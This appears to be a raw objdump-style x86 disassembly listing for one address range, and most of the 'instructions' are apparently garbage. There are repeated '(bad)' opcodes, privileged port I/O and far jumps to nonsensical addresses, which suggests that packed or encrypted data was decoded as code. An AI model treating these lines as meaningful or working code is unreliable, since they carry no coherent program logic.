  41b217:	inc    ebx
  41b218:	int3   
  41b219:	test   DWORD PTR [edi],ebx
  41b21b:	add    eax,ebx
  41b21d:	mov    ds:0xb9447a5b,al
  41b222:	fcmovnu st,st(5)
  41b224:	stos   BYTE PTR es:[edi],al
  41b225:	ret    
  41b226:	stos   DWORD PTR es:[edi],eax
  41b227:	ds xchg ebp,eax
  41b229:	xor    DWORD PTR [ebx-0x7d],eax
  41b22c:	sbb    al,0x5
  41b22e:	pop    ss
  41b22f:	add    BYTE PTR [ebx-0x27],0xb7
  41b233:	push   eax
  41b234:	pop    edx
  41b235:	jg     0x41b246
  41b237:	sub    al,0x5
  41b239:	or     esi,DWORD PTR [esi-0x3019ccea]
  41b23f:	and    ch,BYTE PTR [ebx+0x22]
  41b242:	or     al,0xbb
  41b244:	xchg   ecx,eax
  41b245:	sub    eax,0xf34144b0
  41b24a:	sub    esp,esp
  41b24c:	push   edx
  41b24d:	mov    dl,0xd6
  41b24f:	test   al,0xc3
  41b251:	jge    0x41b2b0
  41b253:	xchg   esp,eax
  41b254:	shr    BYTE PTR [eax-0x34e03505],1
  41b25a:	xor    al,0xc
  41b25c:	pusha  
  41b25d:	(bad)  
  41b25e:	lahf   
  41b25f:	loop   0x41b217
  41b261:	mov    WORD PTR [edi+eax*1+0x4f],es
  41b265:	pop    edi
  41b266:	retf   0x2766
  41b269:	or     al,0x23
  41b26b:	cmp    BYTE PTR [esi+0xac],ah
	...
  41b2d5:	add    BYTE PTR [esi+0x6be069a5],cl
  41b2db:	in     al,dx
  41b2dc:	(bad)  
  41b2dd:	out    dx,eax
  41b2de:	stos   BYTE PTR es:[edi],al
  41b2df:	jge    0x41b27c
  41b2e1:	or     BYTE PTR [eax],dl
  41b2e3:	xor    BYTE PTR [ecx],dl
  41b2e5:	lods   al,BYTE PTR ds:[esi]
  41b2e6:	addr16 and al,0x1
  41b2e9:	add    BYTE PTR [eax],al
  41b2eb:	add    DWORD PTR [eax],eax
  41b2ed:	add    BYTE PTR [edi-0x80],ah
  41b2f0:	aad    0x17
  41b2f2:	aam    0xbe
  41b2f4:	jmp    FWORD PTR [ecx+0x1a512ee4]
  41b2fa:	mov    ecx,0x5b78f9aa
  41b2ff:	ja     0x41b360
  41b301:	pusha  
  41b302:	push   esi
  41b303:	push   esp
  41b304:	data16 lahf 
  41b306:	fdiv   DWORD PTR [ebx+0x3e2341aa]
  41b30c:	arpl   bx,dx
  41b30e:	push   eax
  41b30f:	mov    edx,0x3aef60a2
  41b314:	sub    BYTE PTR [ecx-0x7e426ff1],0x88
  41b31b:	popa   
  41b31c:	adc    eax,0x791a1821
  41b321:	into   
  41b322:	sub    bh,BYTE PTR [edi+esi*4]
  41b325:	inc    ebp
  41b326:	push   esi
  41b327:	mov    bh,cl
  41b329:	and    cl,BYTE PTR [esi+0x6]
  41b32c:	push   edx
  41b32d:	iret   
  41b32e:	jmp    0x41b2cc
  41b330:	mov    dh,0x8b
  41b332:	or     eax,0xd3b390f8
  41b337:	(bad)  
  41b338:	int3   
  41b339:	in     al,0xe8
  41b33b:	nop
  41b33c:	into   
  41b33d:	mov    ebx,0x52c1fad7
  41b342:	and    BYTE PTR [ebp-0x498057b5],dl
  41b348:	sar    BYTE PTR [ebx+0x5f],0xd
  41b34c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b34d:	xchg   ecx,eax
  41b34e:	push   ebx
  41b34f:	add    BYTE PTR [edx],cl
  41b351:	cmp    edx,edx
  41b353:	(bad)  
  41b354:	loope  0x41b322
  41b356:	or     DWORD PTR [eax-0x442f8aa2],ecx
  41b35c:	mov    ecx,0x9084b5c4
  41b361:	dec    ebp
  41b362:	aad    0x2d
  41b364:	and    eax,0x779ee96b
  41b369:	(bad)  
  41b36a:	push   ecx
  41b36b:	xor    edx,DWORD PTR [esi+0x5a9c93d]
  41b371:	adc    al,0x17
  41b373:	push   es
  41b374:	cmp    edi,DWORD PTR [eax-0x110421fa]
  41b37a:	mov    ecx,ebx
  41b37c:	test   DWORD PTR [esi+0x39],esp
  41b37f:	and    BYTE PTR [edi+0x38413b57],cl
  41b385:	inc    esp
  41b386:	in     al,dx
  41b387:	dec    esp
  41b388:	fwait
  41b389:	dec    edx
  41b38a:	cwde   
  41b38b:	sbb    dl,BYTE PTR [ebx+0x76548477]
  41b391:	inc    esp
  41b392:	mov    BYTE PTR [edi-0x3a],0x15
  41b396:	ds in  al,0x6d
  41b399:	sbb    ch,dl
  41b39b:	pop    ss
  41b39c:	inc    ebx
  41b39d:	bound  ecx,QWORD PTR [edx+0x16]
  41b3a0:	fstp   QWORD PTR [esi+0x185100e1]
  41b3a6:	sbb    esi,0x5e
  41b3a9:	sub    eax,0x7c890684
  41b3ae:	test   BYTE PTR [eax+0x60],bl
  41b3b1:	rcl    edx,cl
  41b3b3:	loopne 0x41b3db
  41b3b5:	push   ebp
  41b3b6:	leave  
  41b3b7:	mov    dh,0x0
  41b3b9:	iret   
  41b3ba:	int    0x40
  41b3bc:	leave  
  41b3bd:	das    
  41b3be:	inc    ebp
  41b3bf:	sbb    ebx,DWORD PTR [ebx]
  41b3c1:	xor    ch,ah
  41b3c3:	push   esp
  41b3c4:	dec    ebp
  41b3c5:	rol    eax,0xb8
  41b3c8:	jmp    0x849f6635
  41b3cd:	std    
  41b3ce:	(bad)  
  41b3cf:	je     0x41b37e
  41b3d1:	cmp    cl,BYTE PTR [ecx]
  41b3d3:	dec    edi
  41b3d4:	leave  
  41b3d5:	mov    esi,0x1469eff7
  41b3da:	pushf  
  41b3db:	jle    0x41b435
  41b3dd:	sub    eax,0x2b2262e2
  41b3e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b3e3:	pushf  
  41b3e4:	(bad)  
  41b3e5:	int3   
  41b3e6:	sub    dh,BYTE PTR [ebx+0x301741fc]
  41b3ec:	jnp    0x41b43d
	...
  41b456:	dec    eax
  41b457:	or     eax,0xbb5dab1d
  41b45c:	(bad)  
  41b45d:	out    dx,eax
  41b45e:	xchg   ebp,eax
  41b45f:	iret   
  41b460:	push   ebx
  41b461:	aas    
  41b462:	leave  
  41b463:	sub    al,0xcb
  41b465:	ret    0x2567
  41b468:	add    DWORD PTR [eax],eax
  41b46a:	add    BYTE PTR [ecx],al
  41b46c:	add    BYTE PTR [eax],al
  41b46e:	rol    ah,cl
  41b470:	xchg   esp,eax
  41b471:	lea    ebx,[ecx+0x1f422eb5]
  41b477:	pop    esp
  41b478:	jp     0x41b4cf
  41b47a:	xlat   BYTE PTR ds:[ebx]
  41b47b:	sti    
  41b47c:	test   BYTE PTR [ecx],al
  41b47e:	push   0xfffffff0
  41b480:	cdq    
  41b481:	neg    edx
  41b483:	push   ds
  41b484:	int    0xba
  41b486:	inc    DWORD PTR [ecx+eax*4+0x57de5ad4]
  41b48d:	sbb    DWORD PTR [eax-0xa9f82d5],esi
  41b493:	test   BYTE PTR [ebx],0x8e
  41b496:	mov    esi,0xe8faf77b
  41b49b:	xor    eax,0x94143de6
  41b4a0:	and    eax,0xcbfdec9f
  41b4a5:	(bad)  
  41b4a6:	out    dx,al
  41b4a7:	std    
  41b4a8:	mov    al,0xd0
  41b4aa:	xchg   edi,eax
  41b4ab:	test   BYTE PTR [esi],dl
  41b4ad:	pop    ss
  41b4ae:	and    DWORD PTR [ebx+0x52260045],edx
  41b4b4:	test   eax,0x99a2dc9c
  41b4b9:	jg     0x41b471
  41b4bb:	adc    eax,0x25c2daf7
  41b4c0:	test   BYTE PTR es:[ebp-0x44c1c834],0x41
  41b4c8:	in     eax,0x0
  41b4ca:	push   cs
  41b4cb:	test   al,0xf3
  41b4cd:	xchg   ebp,eax
  41b4ce:	sub    BYTE PTR [esi],dh
  41b4d0:	sahf   
  41b4d1:	push   ss
  41b4d2:	pop    esi
  41b4d3:	adc    DWORD PTR [esi],edx
  41b4d5:	cmp    BYTE PTR [esi+0x34],ch
  41b4d8:	test   BYTE PTR [ecx-0x4d9dd23f],0x91
  41b4df:	js     0x41b48c
  41b4e1:	(bad)  
  41b4e2:	lock ret 0x6d55
  41b4e6:	mov    es,WORD PTR [esp+ebx*2+0x21]
  41b4ea:	js     0x41b4ba
  41b4ec:	xor    al,0x11
  41b4ee:	mov    ah,0xcf
  41b4f0:	fcomp  QWORD PTR [edx-0x4c]
  41b4f3:	(bad)  
  41b4f4:	and    eax,DWORD PTR [esi+0x1c783cea]
  41b4fa:	ja     0x41b4c8
  41b4fc:	jnp    0x41b4ee
  41b4fe:	dec    edi
  41b4ff:	pop    ebx
  41b500:	or     eax,0x4f14b58c
  41b505:	inc    edi
  41b506:	mov    edi,0xf95dfa7e
  41b50b:	add    eax,0x82c45b78
  41b510:	inc    ebp
  41b511:	int    0x74
  41b513:	push   ebp
  41b514:	sti    
  41b515:	add    al,0x16
  41b517:	out    0xd5,al
  41b519:	add    al,0x7d
  41b51b:	cs jb  0x41b562
  41b51e:	push   esp
  41b51f:	xchg   ecx,eax
  41b520:	pop    ebx
  41b521:	cmp    al,0xc2
  41b523:	lea    esi,[ebx+0x4a1199bd]
  41b529:	jmp    0x1b04:0x4d6f7fe4
  41b530:	and    al,0x71
  41b532:	cmp    edi,DWORD PTR [ebx+0x1f]
  41b535:	sub    al,0x38
  41b537:	popa   
  41b538:	jb     0x41b550
  41b53a:	rcl    DWORD PTR [eax],cl
  41b53c:	pop    edi
  41b53d:	lea    ecx,[edx+eax*2-0x68]
  41b541:	bswap  esi
  41b543:	mov    esp,0xa4bdfed3
  41b548:	lds    edi,FWORD PTR [esi+0x45]
  41b54b:	pop    es
  41b54c:	aas    
  41b54d:	inc    esp
  41b54e:	pop    esp
  41b54f:	imul   ecx,DWORD PTR [edx],0x40
  41b552:	sti    
  41b553:	mov    ebx,ebp
  41b555:	stos   DWORD PTR es:[edi],eax
  41b556:	leave  
  41b557:	mov    ds:0xad7bea84,al
  41b55c:	popf   
  41b55d:	push   es
  41b55e:	push   DWORD PTR [ebx+0x30]
  41b561:	dec    eax
  41b562:	xor    BYTE PTR [edx],0xa9
  41b565:	out    dx,eax
  41b566:	loopne 0x41b535
  41b568:	in     al,0xc8
  41b56a:	inc    ebp
  41b56b:	mov    ds:0xd846,al
	...
  41b5d4:	add    BYTE PTR [eax],al
  41b5d6:	aam    0xec
  41b5d8:	add    edi,edi
  41b5da:	cmp    edi,edi
  41b5dc:	(bad)  
  41b5dd:	out    dx,eax
  41b5de:	loope  0x41b5a6
  41b5e0:	jns    0x41b5c3
  41b5e2:	pop    ecx
  41b5e3:	je     0x41b64e
  41b5e5:	mov    ds:0x12667,eax
  41b5ea:	add    BYTE PTR [ecx],al
  41b5ec:	add    BYTE PTR [eax],al
  41b5ee:	jp     0x41b5f0
  41b5f0:	or     al,0x18
  41b5f2:	jbe    0x41b5f9
  41b5f4:	retf   0x945c
  41b5f7:	mov    eax,ds:0x145c238f
  41b5fc:	rol    BYTE PTR [esi-0x5d],0x31
  41b600:	lods   al,BYTE PTR fs:[esi]
  41b602:	mov    cl,0x90
  41b604:	fwait
  41b605:	out    dx,al
  41b606:	jbe    0x41b60a
  41b608:	aaa    
  41b609:	inc    eax
  41b60a:	jmp    FWORD PTR [esi+0x68]
  41b60d:	jnp    0x41b59a
  41b60f:	aad    0xa9
  41b611:	in     eax,dx
  41b612:	add    eax,eax
  41b614:	dec    ebx
  41b615:	pushf  
  41b616:	iret   
  41b617:	mov    esi,0xb27a29d8
  41b61c:	push   ds
  41b61d:	rcl    BYTE PTR [esi+0x7e],1
  41b620:	repz mov esp,0x82aef6fb
  41b626:	cdq    
  41b627:	adc    al,0x1e
  41b629:	or     DWORD PTR [edx],esp
  41b62b:	nop
  41b62c:	jae    0x41b635
  41b62e:	or     eax,0x20635d61
  41b633:	inc    ebx
  41b634:	fnsave [eax+0x7e]
  41b637:	adc    eax,0xb02c35d0
  41b63c:	mov    WORD PTR [edi],es
  41b63e:	loop   0x41b5de
  41b640:	push   ss
  41b641:	fcom   st(3)
  41b643:	(bad)  
  41b644:	in     eax,0x7e
  41b646:	icebp  
  41b647:	xor    BYTE PTR [eax+0x35101622],bh
  41b64d:	ror    BYTE PTR [esp+esi*2],1
  41b650:	pop    ss
  41b651:	retf   0xd2dc
  41b654:	jo     0x41b635
  41b656:	das    
  41b657:	and    DWORD PTR [edi+0x3f722462],edx
  41b65d:	xchg   edx,eax
  41b65e:	pushf  
  41b65f:	mov    al,ds:0x81b449c4
  41b664:	push   edi
  41b665:	pop    edx
  41b666:	mov    bl,0xc2
  41b668:	add    al,BYTE PTR [ebx-0x4b]
  41b66b:	test   DWORD PTR [ebx+0x2efd0db9],eax
  41b671:	or     dh,BYTE PTR [ecx+eiz*8-0xa714448]
  41b678:	repnz les ebx,FWORD PTR [edx]
  41b67b:	mov    eax,ds:0x43ba4127
  41b680:	cli    
  41b681:	enter  0x7b59,0xea
  41b685:	pop    ecx
  41b686:	shl    DWORD PTR [ebx+0x5e7e9abc],cl
  41b68c:	aaa    
  41b68d:	push   0xedda45bd
  41b692:	mov    al,0x23
  41b694:	inc    eax
  41b695:	repz in al,dx
  41b697:	out    0x9b,eax
  41b699:	sub    eax,0x5086cff0
  41b69e:	pop    ecx
  41b69f:	jmp    0x1bc6daf8
  41b6a4:	mov    cs,WORD PTR [ecx+eiz*4+0x7c]
  41b6a8:	cwde   
  41b6a9:	jne    0x41b71c
  41b6ab:	outs   dx,DWORD PTR ds:[esi]
  41b6ac:	inc    edi
  41b6ad:	mov    ah,0x32
  41b6af:	cdq    
  41b6b0:	dec    ebx
  41b6b1:	popa   
  41b6b2:	and    DWORD PTR [esi-0x44],ebx
  41b6b5:	cs and ebx,edi
  41b6b8:	mov    edx,0x33f97a98
  41b6bd:	adc    al,0x96
  41b6bf:	mov    ss,WORD PTR [bx+di]
  41b6c2:	ins    BYTE PTR es:[edi],dx
  41b6c3:	push   edi
  41b6c4:	std    
  41b6c5:	mov    ebp,0x6e43d24d
  41b6ca:	clc    
  41b6cb:	int3   
  41b6cc:	aas    
  41b6cd:	pop    es
  41b6ce:	aas    
  41b6cf:	adc    dl,BYTE PTR [esi+0x733b559a]
  41b6d5:	cmp    al,0xc
  41b6d7:	push   ds
  41b6d8:	fwait
  41b6d9:	push   edx
  41b6da:	iret   
  41b6db:	mov    cl,0x7d
  41b6dd:	js     0x41b68c
  41b6df:	arpl   WORD PTR [eax-0x3d],bx
  41b6e2:	arpl   WORD PTR [edi],sp
  41b6e4:	dec    edi
  41b6e5:	cmp    BYTE PTR [ebx],bl
  41b6e7:	push   edi
  41b6e8:	ds data16 ja 0x41b67a
  41b6ec:	push   eax
  41b6ed:	aad    0x0
	...
  41b753:	add    BYTE PTR [eax],al
  41b755:	add    BYTE PTR [eax-0x2469e49d],ch
  41b75b:	(bad)  
  41b75c:	lods   eax,DWORD PTR ds:[esi]
  41b75d:	jg     0x41b75a
  41b75f:	push   ds
  41b760:	mov    ah,dh
  41b762:	popa   
  41b763:	hlt    
  41b764:	jno    0x41b704
  41b766:	addr16 daa 
  41b768:	add    DWORD PTR [eax],eax
  41b76a:	add    BYTE PTR [ecx],al
  41b76c:	add    BYTE PTR [eax],al
  41b76e:	faddp  st(4),st
  41b770:	ja     0x41b782
  41b772:	mov    DWORD PTR gs:[ecx],esp
  41b775:	dec    ebx
  41b776:	jae    0x41b711
  41b778:	jae    0x41b782
  41b77a:	rcr    ebp,1
  41b77c:	xlat   BYTE PTR ds:[ebx]
  41b77d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b77e:	sub    al,BYTE PTR [eax-0x24]
  41b781:	and    edi,DWORD PTR [eax+0x33]
  41b784:	xchg   ebx,eax
  41b785:	ds cli 
  41b787:	add    BYTE PTR [esi+0x36076036],bh
  41b78d:	ds icebp 
  41b78f:	push   ds
  41b790:	inc    edi
  41b791:	outs   dx,BYTE PTR ds:[esi]
  41b792:	dec    esi
  41b793:	add    al,0xf
  41b795:	test   al,0x67
  41b797:	xchg   DWORD PTR [esi+0x71],ebx
  41b79a:	jp     0x41b80c
  41b79c:	cmp    eax,0x5195a539
  41b7a1:	sbb    ah,dl
  41b7a3:	cwde   
  41b7a4:	sbb    ch,BYTE PTR [ebx+ebp*1]
  41b7a7:	in     eax,0xc4
  41b7a9:	mov    al,0x6
  41b7ab:	and    DWORD PTR [edx],0x2e
  41b7ae:	sbb    DWORD PTR [esp+edx*8-0x48],0x724ac1c7
  41b7b6:	into   
  41b7b7:	dec    eax
  41b7b8:	cmp    DWORD PTR [edx],ebx
  41b7ba:	and    DWORD PTR es:[edi+0x2d72e5a5],0xffffffeb
  41b7c2:	cdq    
  41b7c3:	pop    esi
  41b7c4:	xchg   edx,eax
  41b7c5:	or     eax,0x3f6b63b7
  41b7ca:	fst    QWORD PTR [esp+edx*8]
  41b7cd:	cdq    
  41b7ce:	cld    
  41b7cf:	les    ebp,FWORD PTR [eax-0x1e2cad17]
  41b7d5:	or     bl,BYTE PTR [edi-0x5a28dbf7]
  41b7db:	adc    al,0x5e
  41b7dd:	int    0x43
  41b7df:	call   0xcbfc:0x5effee8b
  41b7e6:	xchg   ecx,eax
  41b7e7:	leave  
  41b7e8:	mov    edx,0x59857efd
  41b7ed:	dec    ecx
  41b7ee:	add    DWORD PTR [eax-0x44],eax
  41b7f1:	add    DWORD PTR [ebx+ebp*4-0x43d86624],ecx
  41b7f8:	adc    eax,0xfddceff6
  41b7fd:	out    dx,eax
  41b7fe:	in     al,0x64
  41b800:	ret    0x5b01
  41b803:	mov    ch,0x4f
  41b805:	or     eax,0x21d4ee35
  41b80a:	jg     0x41b7fa
  41b80c:	in     al,dx
  41b80d:	fst    QWORD PTR [esi]
  41b80f:	jne    0x41b809
  41b811:	adc    eax,0xfe44ffaf
  41b816:	in     al,0x6e
  41b818:	xor    al,0xee
  41b81a:	in     eax,0xf
  41b81c:	cdq    
  41b81d:	mov    ah,0xca
  41b81f:	fs (bad) 
  41b822:	rol    edi,cl
  41b824:	retf   
  41b825:	jne    0x41b7ea
  41b827:	mov    eax,ds:0xf0e6f68c
  41b82c:	ins    DWORD PTR es:[edi],dx
  41b82d:	fnstcw WORD PTR [ebx]
  41b82f:	add    al,BYTE PTR [eax]
  41b831:	mov    cl,0x1
  41b833:	pop    ebp
  41b834:	push   edx
  41b835:	cmc    
  41b836:	(bad)  
  41b837:	and    al,0x3b
  41b839:	test   eax,0xacf786c
  41b83e:	dec    ebx
  41b83f:	scas   al,BYTE PTR es:[edi]
  41b840:	and    BYTE PTR [esi-0xb72691],0x8d
  41b847:	retf   0xaefc
  41b84a:	sub    ebx,DWORD PTR [ebx-0x53e2e1b0]
  41b850:	and    esi,DWORD PTR [eax]
  41b852:	in     al,dx
  41b853:	fiadd  DWORD PTR [ebx+0x3d]
  41b856:	adc    DWORD PTR ds:0x8d4ccd9c,edx
  41b85c:	mov    ?,WORD PTR [eax+0x63]
  41b85f:	data16 fisub WORD PTR [edx+0x28a4dee2]
  41b866:	scas   eax,DWORD PTR es:[edi]
  41b867:	or     al,0xdb
  41b869:	push   0x6
  41b86b:	pop    ebx
  41b86c:	add    DWORD PTR [eax+eax*1],edx
	...
  41b8d3:	add    BYTE PTR [eax],al
  41b8d5:	add    BYTE PTR [edx-0x8b13804],cl
  41b8db:	jg     0x41b868
  41b8dd:	cld    
  41b8de:	ret    0x78e3
  41b8e1:	add    al,0xaa
  41b8e3:	test   al,0x4b
  41b8e5:	xor    DWORD PTR [edi+0x28],esp
  41b8e8:	add    DWORD PTR [eax],eax
  41b8ea:	add    BYTE PTR [ecx],al
  41b8ec:	add    BYTE PTR [eax],al
  41b8ee:	repz jge 0x41b8c3
  41b8f1:	aaa    
  41b8f2:	push   edx
  41b8f3:	push   edi
  41b8f4:	xor    dh,BYTE PTR [ebx]
  41b8f6:	push   ds
  41b8f7:	data16 cmp BYTE PTR [eax-0x23],al
  41b8fb:	inc    ebp
  41b8fc:	arpl   WORD PTR [edi+0x265a2597],ax
  41b902:	ja     0x41b95d
  41b904:	jge    0x41b927
  41b906:	fisub  WORD PTR [ecx-0x31]
  41b909:	pop    esp
  41b90a:	xchg   ebx,eax
  41b90b:	in     eax,0xb1
  41b90d:	adc    dh,BYTE PTR [edi+0x3287ea6f]
  41b913:	jl     0x41b92d
  41b915:	daa    
  41b916:	sahf   
  41b917:	daa    
  41b918:	xor    al,0x87
  41b91a:	cdq    
  41b91b:	scas   al,BYTE PTR es:[edi]
  41b91c:	cmp    eax,DWORD PTR [ecx]
  41b91e:	and    eax,0xdc49eb87
  41b923:	sub    al,BYTE PTR [ecx-0x7067280d]
  41b929:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b92a:	jbe    0x41b8df
  41b92c:	jo     0x41b946
  41b92e:	mov    dl,0xb3
  41b930:	jnp    0x41b979
  41b932:	adc    ebp,0xffffffb4
  41b935:	scas   al,BYTE PTR es:[edi]
  41b936:	and    ah,BYTE PTR [edx-0x736084f4]
  41b93c:	test   BYTE PTR [ebx],ah
  41b93e:	rcl    edx,cl
  41b940:	mov    DWORD PTR [eax+ebx*2],edx
  41b943:	leave  
  41b944:	fidivr DWORD PTR ds:0x8be54bf
  41b94a:	adc    eax,0x3f040ae1
  41b94f:	dec    edi
  41b950:	add    edx,esp
  41b952:	jl     0x41b903
  41b954:	out    dx,eax
  41b955:	sahf   
  41b956:	and    eax,0xb1aeb7e0
  41b95b:	repz sub al,0x44
  41b95e:	stos   DWORD PTR es:[edi],eax
  41b95f:	or     BYTE PTR [ebx+0x55],dh
  41b962:	mov    ebp,0x6ced7690
  41b967:	outs   dx,BYTE PTR ds:[esi]
  41b968:	les    edx,FWORD PTR [ebx+0x526ff974]
  41b96e:	add    BYTE PTR [ecx+edx*4-0x79],0x64
  41b973:	and    edx,DWORD PTR [edx+0x2d7e6008]
  41b979:	pop    ss
  41b97a:	mov    edx,0x6975136f
  41b97f:	adc    al,0x53
  41b981:	lahf   
  41b982:	ror    bl,0x9a
  41b985:	push   0x44e8cbe6
  41b98a:	mov    BYTE PTR [edi+0xe58207e],dl
  41b990:	(bad)
  41b994:	inc    ecx
  41b995:	xchg   esi,eax
  41b996:	push   edi
  41b997:	add    ch,BYTE PTR [edx]
  41b999:	stos   DWORD PTR es:[edi],eax
  41b99a:	imul   edx,DWORD PTR [edx],0x2caf8483
  41b9a0:	mov    esp,edx
  41b9a2:	xchg   ebx,eax
  41b9a3:	ret    
  41b9a4:	pop    ss
  41b9a5:	clc    
  41b9a6:	pushf  
  41b9a7:	lods   al,BYTE PTR ds:[esi]
  41b9a8:	dec    edx
  41b9a9:	adc    BYTE PTR [edi],bl
  41b9ab:	ret    
  41b9ac:	mov    edi,0x38bc73e8
  41b9b1:	cdq    
  41b9b2:	loop   0x41b9dd
  41b9b4:	xor    DWORD PTR [ecx+ecx*2],ecx
  41b9b7:	out    0xb9,al
  41b9b9:	in     al,dx
  41b9ba:	mov    edi,0x656636df
  41b9bf:	stc    
  41b9c0:	mov    ch,BYTE PTR [eax-0x7d2d37c]
  41b9c6:	fimul  DWORD PTR [esi+0x7f]
  41b9c9:	clc    
  41b9ca:	ud2    
  41b9cc:	mov    cl,BYTE PTR [ebx+0x783243c4]
  41b9d2:	lea    ecx,[ebx-0x376f5644]
  41b9d8:	fimul  WORD PTR [ebp+0xea92420]
  41b9de:	js     0x41ba14
  41b9e0:	outs   dx,DWORD PTR ds:[esi]
  41b9e1:	ins    DWORD PTR es:[edi],dx
  41b9e2:	xchg   ebx,eax
  41b9e3:	fcomi  st,st(3)
  41b9e5:	add    BYTE PTR [edx-0x55],0xb0
  41b9e9:	popf   
  41b9ea:	adc    al,0xf3
  41b9ec:	cmc    
  41b9ed:	mov    eax,0x0
	...
  41ba56:	ret    
  41ba57:	mov    esp,0xf87f4844
  41ba5c:	iret   
  41ba5d:	mov    edi,0x8c8b3b8c
  41ba62:	and    eax,DWORD PTR [ebx+0x23]
  41ba65:	jae    0x41bace
  41ba67:	sub    DWORD PTR [ecx],eax
  41ba69:	add    BYTE PTR [eax],al
  41ba6b:	add    DWORD PTR [eax],eax
  41ba6d:	add    BYTE PTR [ebp+0x951a047],bl
  41ba73:	in     al,0xc7
  41ba75:	cli    
  41ba76:	aas    
  41ba77:	mov    ebp,0xa4b4a74a
  41ba7c:	and    BYTE PTR [edx+ebx*2+0x2b],cl
  41ba80:	ret    0xbbb4
  41ba83:	idiv   BYTE PTR [ebx+0x1c]
  41ba86:	loopne 0x41ba66
  41ba88:	jmp    0xf47e:0x5f16e018
  41ba8f:	or     BYTE PTR [edx+ebp*2+0x3bf31a64],0xff
  41ba97:	rcr    BYTE PTR [ebp-0x25dcdea2],1
  41ba9d:	and    edx,DWORD PTR [eax+0x6d]
  41baa0:	push   ebp
  41baa1:	mov    esp,0x2aefcb53
  41baa6:	cs (bad) 
  41baa9:	test   DWORD PTR [ebp-0x12],esp
  41baac:	cmp    esp,DWORD PTR [edi-0xe]
  41baaf:	pop    ebp
  41bab0:	mov    eax,ds:0x69df796c
  41bab5:	sti    
  41bab6:	cwde   
  41bab7:	out    0xad,eax
  41bab9:	popf   
  41baba:	lahf   
  41babb:	pop    ebx
  41babc:	fs jg  0x41bac3
  41babf:	inc    ebp
  41bac0:	push   esp
  41bac1:	idiv   DWORD PTR [ecx]
  41bac3:	mov    ecx,0x195c8e4
  41bac8:	or     al,0x6c
  41baca:	lea    ebx,[esi]
  41bacc:	neg    BYTE PTR [edi]
  41bace:	pop    ds
  41bacf:	icebp  
  41bad0:	jbe    0xe8ea17b5
  41bad6:	retf   0xd78b
  41bad9:	enter  0x31d,0x4d
  41badd:	adc    eax,0xff1dba1a
  41bae2:	retf   0x37e3
  41bae5:	adc    eax,0xcf971541
  41baea:	call   0x9e78:0x2aa9f71e
  41baf1:	mov    edx,DWORD PTR [esp+edi*4+0x46c7fc8b]
  41baf8:	dec    edx
  41baf9:	cmc    
  41bafa:	adc    al,0x3b
  41bafc:	shl    BYTE PTR [eax],cl
  41bafe:	enter  0x4716,0x91
  41bb02:	jbe    0x41bb17
  41bb04:	aam    0x75
  41bb06:	stos   BYTE PTR es:[edi],al
  41bb07:	(bad)  
  41bb08:	sbb    eax,0xa0bf9fa0
  41bb0d:	mov    ch,0x7c
  41bb0f:	cmp    al,0xfc
  41bb11:	loop   0x41ba93
  41bb13:	pop    ecx
  41bb14:	outs   dx,DWORD PTR ds:[esi]
  41bb15:	inc    esp
  41bb16:	adc    edi,DWORD PTR [eax+0x1c]
  41bb19:	mov    DWORD PTR [edx],esi
  41bb1b:	mov    ebp,0x8a554553
  41bb20:	(bad)  
  41bb21:	and    ebx,DWORD PTR [eax+0x23]
  41bb24:	retf   0x4634
  41bb27:	pop    edi
  41bb28:	inc    edx
  41bb29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bb2a:	mov    ds:0x395bf3c4,al
  41bb2f:	push   cs
  41bb30:	pshufw mm6,QWORD PTR [eax+0x6df6ea20],0x3a
  41bb38:	xor    BYTE PTR [eax-0x66],dh
  41bb3b:	sub    DWORD PTR ds:0xb0a0a8f5,esp
  41bb41:	sub    esi,DWORD PTR [eax]
  41bb43:	in     eax,0xd9
  41bb45:	jmp    0x41bb0e
  41bb47:	cld    
  41bb48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bb49:	push   cs
  41bb4a:	icebp  
  41bb4b:	sub    al,0xd8
  41bb4d:	jg     0x41bb6e
  41bb4f:	mov    ds:0x4b45dade,eax
  41bb54:	dec    ebx
  41bb55:	pop    esi
  41bb56:	mov    al,ds:0xc959d6a7
  41bb5b:	inc    ebx
  41bb5c:	add    al,0x0
  41bb5e:	xchg   ecx,eax
  41bb5f:	out    0xcb,al
  41bb61:	pop    ebp
  41bb62:	repz jmp 0x8e5c:0x28e70e20
  41bb6a:	int3   
  41bb6b:	add    dh,BYTE PTR [ecx+0x4f]
	...
  41bbd6:	or     bh,BYTE PTR [eax-0x4048555b]
  41bbdc:	(bad)  
  41bbde:	jg     0x41bbe5
  41bbe0:	arpl   WORD PTR [edi+0x37],cx
  41bbe3:	imul   ecx,DWORD PTR [edi+0x12a6735],0x0
  41bbea:	add    BYTE PTR [ecx],al
  41bbec:	add    BYTE PTR [eax],al
  41bbee:	sahf   
  41bbef:	inc    esi
  41bbf0:	cmp    eax,0x2293082c
  41bbf5:	adc    al,0x38
  41bbf7:	jb     0x41bc6d
  41bbf9:	stc    
  41bbfa:	xchg   ebp,eax
  41bbfb:	xchg   ecx,eax
  41bbfc:	loope  0x41bb87
  41bbfe:	cmp    BYTE PTR cs:[eax-0x1c],dh
  41bc02:	test   al,0x99
  41bc04:	and    dh,BYTE PTR [eax-0x32]
  41bc07:	fs and eax,0x4facf896
  41bc0d:	dec    ecx
  41bc0e:	push   eax
  41bc0f:	cmp    bh,ch
  41bc11:	in     al,0xbb
  41bc13:	or     BYTE PTR [ebx+0x67],al
  41bc16:	clc    
  41bc17:	test   DWORD PTR [edx-0x65],esi
  41bc1a:	ss pop es
  41bc1c:	xor    al,0x85
  41bc1e:	in     al,0x12
  41bc20:	jle    0x41bc6e
  41bc22:	dec    edi
  41bc23:	stos   BYTE PTR es:[edi],al
  41bc24:	xchg   esp,eax
  41bc25:	shl    DWORD PTR [edx-0xf7d67dd],0xfb
  41bc2c:	dec    eax
  41bc2d:	repnz ss (bad) 
  41bc32:	int    0x9a
  41bc34:	lods   al,BYTE PTR ds:[esi]
  41bc35:	cli    
  41bc36:	test   eax,0xe1843fa0
  41bc3b:	jmp    0xcc969613
  41bc40:	jo     0x41bbe3
  41bc42:	test   esp,esp
  41bc44:	jle    0x41bca4
  41bc46:	int    0xa9
  41bc48:	das    
  41bc49:	adc    eax,0x798d38fc
  41bc4e:	test   al,0x95
